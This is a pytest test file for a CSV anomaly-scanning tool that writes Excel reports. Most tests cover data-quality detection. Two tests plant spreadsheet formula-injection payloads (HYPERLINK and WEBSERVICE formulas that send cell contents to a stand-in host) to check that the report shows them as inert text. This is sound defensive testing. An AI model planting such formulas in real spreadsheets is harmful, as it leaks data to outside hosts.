import csv

import numpy as np
import pandas as pd
import pytest
from openpyxl import load_workbook

from anomaly_hunter.cli import run_scan
from anomaly_hunter.limits import read_limits, suggest_limits


def make_clean_csv(path, n=40, seed=0):
    rng = np.random.RandomState(seed)
    df = pd.DataFrame({
        "order": range(1, n + 1),
        "Amount": rng.normal(100, 5, n).round(2),
        "Price": rng.normal(50, 2, n).round(2),
    })
    df.to_csv(path, index=False)
    return df


def write_limits(path, columns_bounds):
    with open(path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["column", "baseline_low", "baseline_high", "weird_low", "weird_high"])
        for col, bounds in columns_bounds.items():
            w.writerow([col, *["" if b is None else b for b in bounds]])


# ---- Hazmat tests: each planted anomaly must be caught, in the right bucket ----

def test_hazmat_weird_limit_breach(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    bad_row = pd.DataFrame([{"order": 999, "Amount": 999999, "Price": 50}])
    pd.concat([df, bad_row]).to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"Amount": (80, 120, 0, 10000), "Price": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    amount_idx, sev_idx, bucket_idx = header.index("Amount"), header.index("Severity"), header.index("Bucket")
    flagged = next(r for r in body if r[amount_idx] == 999999)
    assert flagged[sev_idx] in ("Medium", "High")
    assert flagged[bucket_idx] == "Irregularities"


def test_hazmat_duplicate_row(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    pd.concat([df, df.iloc[[0]]]).to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    assert any(r[header.index("Bucket")] == "Duplicates" for r in body)


def test_hazmat_text_in_number_column(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    df["Amount"] = df["Amount"].astype(object)
    df.loc[5, "Amount"] = "N/A"
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "Amount": (None, None, None, None),
                                "Price": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    reason_idx, bucket_idx = header.index("Reason"), header.index("Bucket")
    matches = [r for r in body if "N/A" in (r[reason_idx] or "")]
    assert matches
    assert matches[0][bucket_idx] == "Irregularities"


def test_hazmat_spike_in_ordered_series(tmp_path):
    csv_path = tmp_path / "data.csv"
    n = 40
    rng = np.random.RandomState(1)
    df = pd.DataFrame({"order": range(1, n + 1), "Revenue": rng.normal(1000, 20, n).round(2)})
    df.loc[20, "Revenue"] = 5000  # planted spike, single row
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "Revenue": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), "order", str(out_path)) == 0

    rows = list(load_workbook(out_path)["Anomalies"].iter_rows(values_only=True))
    header, body = rows[0], rows[1:]
    flagged_orders = [r[header.index("order")] for r in body]
    assert 21 in flagged_orders  # df index 20 -> order value 21


def test_hazmat_isolation_combo_runs_clean(tmp_path):
    csv_path = tmp_path / "data.csv"
    n = 60
    rng = np.random.RandomState(2)
    a = rng.normal(0, 1, n)
    b = a + rng.normal(0, 0.1, n)
    df = pd.DataFrame({"order": range(1, n + 1), "A": a.round(2), "B": b.round(2)})
    df.loc[30, "A"] = 0.0
    df.loc[30, "B"] = 5.0  # each value alone plausible, combination is not
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"order": (None, None, None, None), "A": (None, None, None, None),
                                "B": (None, None, None, None)})

    out_path = tmp_path / "report.xlsx"
    # Not asserting this exact row is caught — ML detection on a 60-row sample is
    # inherently noisy. This just proves the isolation/clustering path runs clean.
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0


# ---- Quiet-crowd test ----

def test_quiet_crowd_low_false_positive_rate(tmp_path):
    csv_path = tmp_path / "data.csv"
    rng = np.random.RandomState(42)
    df = pd.DataFrame({
        "Amount": rng.normal(100, 5, 1000).round(2),
        "Price": rng.normal(50, 2, 1000).round(2),
    })
    df.to_csv(csv_path, index=False)

    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["Amount", "Price"], limits_path)

    out_path = tmp_path / "report.xlsx"
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    flagged = load_workbook(out_path)["Anomalies"].max_row - 1
    assert flagged <= 10  # <=1% of 1000, Noted rows don't count toward this


# ---- Limits tests ----

def test_missing_limits_file_writes_suggestions_and_exits_2(tmp_path):
    csv_path = tmp_path / "data.csv"
    make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    out_path = tmp_path / "report.xlsx"

    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 2
    assert limits_path.exists()
    # "order" is 1..n - a row identifier, not a measurement: no limits for it
    assert set(pd.read_csv(limits_path)["column"]) == {"Amount", "Price"}


def test_suggested_lows_stop_at_zero_for_nonnegative_columns():
    # Real-Excel finding: Units -5 slipped past a suggested low of -53
    from anomaly_hunter.limits import suggest_limits_dict
    df = pd.DataFrame({"Units": [95, 50, 36, 27, 56, 60, 75, 90, 32, 60] * 3 + [-5], "Delta": range(-15, 16)})
    b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Units", "Delta"])["Units"]
    assert b_lo == 0.0 and w_lo == 0.0  # -5 now breaks the weird limit
    assert suggest_limits_dict(df, ["Delta"])["Delta"][0] < 0  # genuinely signed column keeps negative lows


def test_blank_limit_cells_mean_no_limit(tmp_path):
    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"Amount": (None, None, None, None)})
    limits, warnings = read_limits(limits_path, {"Amount": "number"})
    assert limits["Amount"] == (None, None, None, None)
    assert warnings == []


def test_unknown_limits_column_warns_not_crash(tmp_path):
    limits_path = tmp_path / "limits.csv"
    write_limits(limits_path, {"NotAColumn": (0, 1, 0, 1)})
    limits, warnings = read_limits(limits_path, {"Amount": "number"})
    assert limits == {}
    assert len(warnings) == 1


# ---- Report test ----

def test_report_has_three_sheets_and_summary(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)
    out_path = tmp_path / "report.xlsx"

    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0

    wb = load_workbook(out_path)
    assert set(wb.sheetnames) == {"Data", "Anomalies", "Summary"}
    summary_text = "\n".join(str(c.value) for row in wb["Summary"].iter_rows() for c in row if c.value is not None)
    assert "Limits file" in summary_text
    assert "K" in summary_text



def test_report_never_runs_formulas_from_the_scanned_file(tmp_path):
    csv_path = tmp_path / "evil.csv"
    make_clean_csv(csv_path, n=40)
    with open(csv_path, "a") as f:
        f.write('"=HYPERLINK(""http://evil/?""&A2,""x"")",9999,50\n')  # flagged, so it lands on Anomalies too
    limits_path, out_path = tmp_path / "limits.csv", tmp_path / "report.xlsx"
    run_scan([str(csv_path)], str(limits_path), None, str(out_path))  # writes limits
    assert run_scan([str(csv_path)], str(limits_path), None, str(out_path)) == 0
    wb = load_workbook(out_path)
    cells = [c for ws in wb for row in ws.iter_rows() for c in row if str(c.value).startswith("=HYPERLINK")]
    assert len(cells) >= 2 and all(c.data_type == "s" for c in cells)  # Data + Anomalies: shown as text, never run

# ---- Safety test ----

def test_input_file_untouched(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=40)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)
    out_path = tmp_path / "report.xlsx"

    before_bytes = csv_path.read_bytes()
    before_mtime = csv_path.stat().st_mtime

    run_scan([str(csv_path)], str(limits_path), None, str(out_path))

    assert csv_path.read_bytes() == before_bytes
    assert csv_path.stat().st_mtime == before_mtime


# ---- Determinism test ----

def test_determinism(tmp_path):
    csv_path = tmp_path / "data.csv"
    df = make_clean_csv(csv_path, n=60, seed=7)
    limits_path = tmp_path / "limits.csv"
    suggest_limits(df, ["order", "Amount", "Price"], limits_path)

    out1, out2 = tmp_path / "report1.xlsx", tmp_path / "report2.xlsx"
    run_scan([str(csv_path)], str(limits_path), None, str(out1))
    run_scan([str(csv_path)], str(limits_path), None, str(out2))

    rows1 = list(load_workbook(out1)["Anomalies"].iter_rows(values_only=True))
    rows2 = list(load_workbook(out2)["Anomalies"].iter_rows(values_only=True))
    assert rows1 == rows2


def test_identifier_columns_are_not_measurements():
    """SKU/MRN/ZIP/order numbers label rows: no limits, no votes - they used to flag EVERY row."""
    from anomaly_hunter.load import load_from_records
    rng = np.random.RandomState(3)
    n = 60
    cols = ["SKU", "MRN", "ZIP", "Year", "Price", "Units"]
    rows = [[100200 + k, int(rng.randint(1e6, 9e6)), int(rng.choice([2134, 60601])), 2019 + k % 7,
             int(rng.uniform(1e5, 9e5)), int(rng.randint(10, 90))] for k in range(n)]
    _, types, _ = load_from_records(cols, rows)
    assert types == {"SKU": "id", "MRN": "id", "ZIP": "id", "Year": "number", "Price": "number", "Units": "number"}


def test_codes_that_look_like_dates_stay_text():
    from anomaly_hunter.load import load_from_records
    _, types, _ = load_from_records(["Cost Code", "When"], [["03-100", "2026-01-05"], ["03-101", "2026-01-06"], ["04-115", "1/7/2026"]])
    assert types == {"Cost Code": "text", "When": "date"}


def test_totals_rows_are_not_checked_but_a_vendor_called_total_is():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.pipeline import summary_rows
    rows = [["2026-01-%02d" % (k + 1), "Total Wine" if k == 3 else "Vendor %d" % k, 100 + k] for k in range(10)]
    rows += [["Total", "", 1045], ["", "", ""], ["", "Grand Total", 2090]]
    rows += [["2026-02-01", "Vendor x", 5], ["2026-02-02", "Vendor y", 6], ["2026-02-03", "Vendor z", 7], ["", "", 18]]  # unlabelled sum
    df, _, _ = load_from_records(["Date", "Vendor", "Amount"], rows)
    assert list(summary_rows(df).nonzero()[0]) == [10, 11, 12, 16]


def test_likely_typo_fixes_and_real_outliers_left_alone():
    from anomaly_hunter.detectors import column_stats, likely_value
    tight = np.array([26.0, 31, 28, 25, 30, 27, 29, 33, 24, 28])
    assert likely_value(2900.0, column_stats(np.append(tight, 2900)), 15, 45) == 29  # x100 (extra zeros)
    assert likely_value(-29.0, column_stats(np.append(tight, -29)), 15, 45) == 29  # sign flip in an all-positive column
    assert likely_value(0.29, column_stats(np.append(tight, 0.29)), 15, 45) == 29  # missing zeros
    pct = np.array([0.12, 0.15, 0.11, 0.14, 0.13, 0.16, 0.12, 0.15])
    assert likely_value(13.0, column_stats(np.append(pct, 13)), 0.05, 0.25) == 0.13  # % typed as 13 for 0.13
    pnl = np.array([520.0, -310, 870, -45, 1200, -760, 300, 95, -1500, 640])
    assert likely_value(-120.0, column_stats(np.append(pnl, -120)), -2000, 2000) is None  # negatives are normal here: no flip
    claims = np.array([900.0, 2500, 15000, 4200, 700, 38000, 1200, 6100, 22000, 3100])
    assert likely_value(90000.0, column_stats(np.append(claims, 90000)), 0, 40000) is None  # whale claim: only 2.4x the next one


def test_category_spelled_differently_is_flagged_with_the_usual_spelling():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.pipeline import score
    depts = ["Sales", "Ops", "IT", "Finance"] * 10 + ["sales", "IT ", "IT"]
    df, types, errors = load_from_records(["Dept", "Hours"], [[d, 30 + k % 17 + k / 100] for k, d in enumerate(depts)])
    rows, _ = score(df, types, errors, {}, None)
    assert rows[40]["likely"] == {"Dept": "Sales"} and "looks like" in rows[40]["reason"]
    assert rows[41]["likely"] == {"Dept": "IT"}  # trailing space
    assert not any(r["severity"] for r in rows[:40])  # the usual spellings are fine


def test_value_100x_too_small_is_weird_in_a_positive_column():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.limits import suggest_limits_dict
    rng = np.random.RandomState(101)
    df, _, _ = load_from_records(["Sq Ft"], [[int(rng.uniform(900, 3500))] for _ in range(70)] + [[22]])
    assert suggest_limits_dict(df, ["Sq Ft"])["Sq Ft"][2] > 22  # weird low no longer rounds down to 0


def test_two_slips_at_once_is_not_an_obvious_typo():
    from anomaly_hunter.detectors import column_stats, likely_value
    units = np.array([40.0, 52, 61, 47, 55, 58, 44, 50, 66, 49])
    assert likely_value(-5.0, column_stats(np.append(units, -5)), 25, 80) is None  # -5 -> 50 would be sign AND zeros: just guessing


def test_review_fixes_ids_totals_names():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.limits import suggest_limits_dict
    from anomaly_hunter.pipeline import score, summary_rows
    # a text ID among numeric IDs is a value, not a blank
    df, types, errors = load_from_records(["SKU", "Qty"], [[100200 + k, 10 + k % 7 + k / 100] for k in range(40)] + [["A-17", 12.5]])
    rows, _ = score(df, types, errors, {}, None)
    assert types["SKU"] == "id" and not rows[-1]["severity"]
    # 0/1 count columns: no fake "sum rows"
    df, _, _ = load_from_records(["Late", "Damaged"], [[a, b] for _ in range(10) for a, b in ((1, 0), (0, 1), (1, 1), (0, 0))])
    assert not summary_rows(df).any()
    # "Average" as a category in an otherwise full row (one blank) is data
    df, _, _ = load_from_records(["Rating", "Score", "Note"], [["Good", 5 + k % 3, "x"] for k in range(9)] + [["Average", 4, ""]])
    assert not summary_rows(df).any()
    # whole-word ID names only
    _, types, _ = load_from_records(["Mean", "Zip Code", "Clean"], [[k % 9, 60601 + k % 3, k % 4] for k in range(30)])
    assert types == {"Mean": "number", "Zip Code": "id", "Clean": "number"}
    # baseline low never tighter than weird low
    rng = np.random.RandomState(5)
    df, _, _ = load_from_records(["Paid"], [[round(float(rng.lognormal(8, 1)), 2)] for _ in range(80)])
    b_lo, _, w_lo, _ = suggest_limits_dict(df, ["Paid"])["Paid"]
    assert b_lo >= w_lo


def test_formula_like_text_is_never_offered_as_a_spelling_fix():
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.pipeline import score
    vals = ['=WEBSERVICE("https://x/?"&A1)'] * 4 + ['=webservice("https://x/?"&a1)'] + ["Ok"] * 30
    df, types, errors = load_from_records(["Note", "N"], [[v, k] for k, v in enumerate(vals)])
    rows, _ = score(df, types, errors, {}, None)
    assert not any(r.get("likely") for r in rows)


# ---- Batch 2: clustering once per distinct row = the same answer as on every row, without the blow-up ----

def _clustering_on_every_row(df, types):  # the original algorithm, kept here as the reference
    from sklearn.cluster import DBSCAN
    from sklearn.neighbors import NearestNeighbors
    from anomaly_hunter.detectors import K, _scaled, numbers, spread
    x, n = _scaled(df, numbers(types)).to_numpy(), len(df)
    ms = max(5, 2 * len(numbers(types)))
    kth = NearestNeighbors(n_neighbors=min(ms, n - 1)).fit(x).kneighbors()[0][:, -1]
    return DBSCAN(eps=max(np.median(kth) + K * spread(kth), 1e-9), min_samples=ms).fit_predict(x) == -1


@pytest.mark.parametrize("make", [
    lambda r: [[f"r{i}", int(r.integers(1, 6)), float(r.choice([1.0, 1.5, 2.0, 3.0, 4.0, 5.0]))] for i in range(3000)],  # sales: few patterns
    lambda r: [[f"r{i}", float(r.normal(100, 5)), float(r.normal(50, 2))] for i in range(1500)],  # all different
    lambda r: [[f"r{i}", int(r.integers(1, 4)), 7.0] for i in range(40)] + [["x", 90, 7.0]],  # small, one odd row
    lambda r: [[f"r{i}", 5.0, 5.0] for i in range(30)],  # every row the same
])
def test_clustering_on_distinct_rows_matches_every_row(make):
    from anomaly_hunter.detectors import clustering_detector
    from anomaly_hunter.load import load_from_records
    df, types, _ = load_from_records(["Id", "A", "B"], make(np.random.default_rng(1)))
    got = clustering_detector(df, types)
    assert got["ran"] and np.array_equal(got["votes"], _clustering_on_every_row(df, types))


def test_clustering_sits_out_with_a_reason_when_rows_are_too_varied(monkeypatch):
    from anomaly_hunter import detectors
    from anomaly_hunter.load import load_from_records
    monkeypatch.setattr(detectors, "MAX_DISTINCT", 100)
    df, types, _ = load_from_records(["Id", "A"], [[f"r{i}", float(i) * 1.37] for i in range(300)])
    r = detectors.clustering_detector(df, types)
    assert not r["ran"] and "too many different rows" in r["sit_out_reason"]


# ---- Batch 3: catch what it used to miss (each failed on the old code) ----

def _scan(cols, rows, limits=None):
    from anomaly_hunter.load import load_from_records
    from anomaly_hunter.limits import suggest_limits_dict
    from anomaly_hunter.load import numbers
    from anomaly_hunter.pipeline import score
    df, types, errors = load_from_records(cols, rows)
    lim = limits or suggest_limits_dict(df, numbers(types))
    out, _ = score(df, types, errors, lim, None)
    return types, out


def test_a_few_excel_errors_do_not_switch_a_number_column_off():
    rows = [[f"n{i}", 50 + i % 7] for i in range(40)]
    rows[39][1] = 100000
    for i in range(5):
        rows[i][1] = "#DIV/0!"
    types, out = _scan(["Name", "Amt"], rows)
    assert types["Amt"] == "number" and out[39]["severity"] in ("Medium", "High")
    assert all("Excel error #DIV/0! in Amt" in out[i]["reason"] for i in range(5))
    types, _ = _scan(["Name", "Amt"], [[f"n{i}", "#N/A" if i % 3 else i] for i in range(30)])  # mostly errors: still text
    assert types["Amt"] == "text"


def test_error_text_is_not_also_called_blank_and_real_blanks_are_found():
    rows = [[f"n{i}", 50 + i % 7] for i in range(60)]
    for i in (3, 4, 5):
        rows[i][1] = "ERROR"
    rows[10][1] = ""
    _, out = _scan(["Name", "Amt"], rows)
    assert all("Blank" not in out[i]["reason"] and 'Text "ERROR"' in out[i]["reason"] for i in (3, 4, 5))
    assert "Blank cell in column Amt" in out[10]["reason"]


def test_a_blank_in_a_filled_text_column_is_found_but_not_in_a_half_empty_one():
    rows = [[f"n{i}", ["Coffee", "Tea", "Cake"][i % 3], "" if i % 2 else "note"] for i in range(60)]
    rows[9][1] = ""
    _, out = _scan(["Name", "Item", "Note"], rows)
    assert out[9]["reason"] == "Blank cell in column Item, which is otherwise filled"
    assert not any("Note" in r["reason"] for r in out)


def test_text_in_a_date_column_is_named_not_called_blank():
    rows = [[f"n{i}", f"2024-01-{1 + i % 28:02d}", 50 + i % 7] for i in range(40)]
    rows[7][1] = "UNKNOWN"
    _, out = _scan(["Name", "When", "Amt"], rows)
    assert out[7]["reason"] == 'Text "UNKNOWN" in date column When'


def test_a_fully_blank_row_says_nothing():
    rows = [[f"n{i}", 50 + i % 7] for i in range(30)] + [["", ""]] + [[f"m{i}", 50 + i % 7] for i in range(9)]
    _, out = _scan(["Name", "Amt"], rows)
    assert out[30]["reason"] == "" and out[30]["severity"] is None


def test_money_and_percent_text_is_checked_as_numbers():
    rows = [[f"n{i}", f"${1000 + i * 3:,}.00", f"{10 + i % 5}%", f"({100 + i * 7 % 13 * 9})" if i % 4 == 0 else str(100 + i * 7 % 13 * 9)] for i in range(40)]
    rows[39][1] = "$1,000,000.00"
    types, out = _scan(["Name", "Price", "Rate", "Net"], rows)
    assert (types["Price"], types["Rate"], types["Net"]) == ("number", "number", "number")
    assert out[39]["severity"] in ("Medium", "High") and "Price" in out[39]["reason"]
    types, _ = _scan(["Zip", "Phone"], [[f"0{2100 + i}", f"(555) 123-{4000 + i}"] for i in range(30)])
    assert types["Phone"] == "text"  # a phone number is not an accounting negative


def test_placeholders_in_text_columns_are_flagged_but_a_convention_is_not():
    rows = [[f"n{i}", ["Cash", "Card", "Online"][i % 3], ["East", "West"][i % 2]] for i in range(60)]
    rows[5][1], rows[6][1], rows[7][2] = "ERROR", "UNKNOWN", "N/A"
    _, out = _scan(["Name", "Pay", "Region"], rows)
    assert out[5]["reason"] == 'Placeholder "ERROR" in column Pay' and out[7]["reason"] == 'Placeholder "N/A" in column Region'
    assert out[5]["bucket"] == "Irregularities"
    rows = [[f"n{i}", "-" if i % 2 else "x", "NA", "None"] for i in range(30)]  # "-" is half the column: the sheet's convention
    _, out = _scan(["Name", "Note", "Country", "Discount"], rows)
    assert not any(r["severity"] for r in out)


def test_day_first_dates_are_read_the_same_way_down_the_column():
    from anomaly_hunter.load import load_from_records
    df, types, _ = load_from_records(["When", "Amt"], [["01/02/2024", 1], ["13/01/2024", 2], ["02/03/2024", 3]])
    assert types["When"] == "date" and [d.strftime("%Y-%m-%d") for d in df["When"]] == ["2024-02-01", "2024-01-13", "2024-03-02"]
    df, _, _ = load_from_records(["When", "Amt"], [["01/02/2024", 1], ["01/13/2024", 2]])  # month first stays month first
    assert [d.strftime("%Y-%m-%d") for d in df["When"]] == ["2024-01-02", "2024-01-13"]


# ---- Batch 4: fewer false alarms, clearer words ----

def test_a_normal_row_is_not_mistaken_for_an_unlabelled_total():
    rows = [["item0", 1, "a"], ["item1", 1, ""], ["item2", 2, ""]] + [[f"item{i}", 1 + i % 3, "x"] for i in range(3, 40)]
    _, out = _scan(["Item", "Qty", "Note"], rows)
    assert "Totals" not in out[2]["reason"]
    rows = [[f"item{i}", 10 + i % 4, "x"] for i in range(10)] + [["", sum(10 + i % 4 for i in range(10)), ""]] + [[f"m{i}", 10 + i % 4, "x"] for i in range(30)]
    _, out = _scan(["Item", "Qty", "Note"], rows)
    assert out[10]["reason"] == "Totals/summary row - not checked"  # a real unlabelled total is still recognised


def test_no_fractional_typo_guess_in_a_whole_number_column():
    rows = [[f"n{i}", 1 + i % 5] for i in range(60)]
    rows[30][1] = 999
    _, out = _scan(["Name", "Quantity"], rows)
    assert out[30]["severity"] and "likely" not in out[30]["reason"]


def test_one_spike_is_reported_once():
    rows = [[f"2024-01-{1 + i % 28:02d}" if i < 28 else f"2024-02-{i - 27:02d}", 100 + i % 3] for i in range(50)]
    rows[25][1] = 900
    _, out = _scan(["When", "Sales"], rows)
    assert out[25]["reason"].count("jumped sharply") <= 1 and "order change" not in out[25]["reason"]


def _daily(n=200, base=500):
    return [[f"d{i}", 0 if i % 7 in (5, 6) else base - 20 + (i * 13) % 41] for i in range(n)]


def test_weekend_zeros_are_normal_but_sentinels_are_still_caught():
    from anomaly_hunter.limits import suggest_limits_dict
    from anomaly_hunter.load import load_from_records, numbers
    rows = _daily()
    df, types, _ = load_from_records(["Day", "Sales"], rows)
    lim = suggest_limits_dict(df, numbers(types))
    assert lim["Sales"][0] == lim["Sales"][2] == 0.0
    _, out = _scan(["Day", "Sales"], rows)
    assert not [r for r in out if r["severity"] in ("Medium", "High")]
    for code in (9999, -1, 0):  # a "missing" code at 3% of a column around 500 is still caught
        rows = [[f"d{i}", code if i % 33 == 0 else 480 + (i * 13) % 41] for i in range(200)]
        _, out = _scan(["Day", "Sales"], rows)
        assert all(out[i]["severity"] in ("Medium", "High") for i in range(0, 200, 33)), code


@pytest.mark.xfail(strict=True, reason="known limitation: one low/high range can't describe two clusters (two products)")
def test_two_product_clusters_do_not_flood():
    rows = [[f"r{i}", 500 + i % 11 if i % 10 < 3 else 100 + i % 7] for i in range(200)]
    _, out = _scan(["Row", "Price"], rows)
    assert sum(r["severity"] in ("Medium", "High") for r in out) <= 2


def test_one_day_first_date_does_not_flip_the_iso_dates_around_it():
    from anomaly_hunter.load import load_from_records
    rows = [[f"2024-01-0{d}", d] for d in range(1, 7)] + [["25/12/2024", 7], ["2024-02-03 00:00:00", 8]]
    df, types, _ = load_from_records(["When", "Amt"], rows)
    assert types["When"] == "date"
    assert [d.strftime("%Y-%m-%d") for d in df["When"]] == [f"2024-01-0{d}" for d in range(1, 7)] + ["2024-12-25", "2024-02-03"]



def test_cell_text_quoted_in_a_reason_is_kept_short():
    rows = [[f"n{i}", 50 + i % 7] for i in range(40)]
    rows[3][1] = "x" * 5000
    _, out = _scan(["Name", "Amt"], rows)
    assert len(out[3]["reason"]) < 200 and out[3]["reason"].startswith('Text "xxx')
